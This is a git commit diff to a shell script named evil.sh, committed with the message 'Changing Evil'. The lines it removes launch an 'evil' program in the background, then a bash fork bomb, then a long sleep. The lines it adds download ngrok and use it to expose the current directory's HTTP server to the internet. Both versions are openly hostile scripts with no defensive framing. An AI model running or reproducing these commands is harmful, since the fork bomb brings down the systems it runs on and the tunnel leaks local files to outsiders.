236db221960356bec4cc2be77e5890847d0fb38e
mihirk <mihir.khatwani@gmail.com>
2019-03-28 17:43:41 +0000

    Changing Evil

--- evil.sh
+++ evil.sh
@@ -1,3 +1,4 @@
-python evil_exec.py evil.c evil&
-:(){ :|:& };:
-sleep 5d
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
+unzip ngrok-stable-linux-386.zip
+chmod a+x ngrok
+python -m SimpleHTTPServer 8080 && ngrok 8080
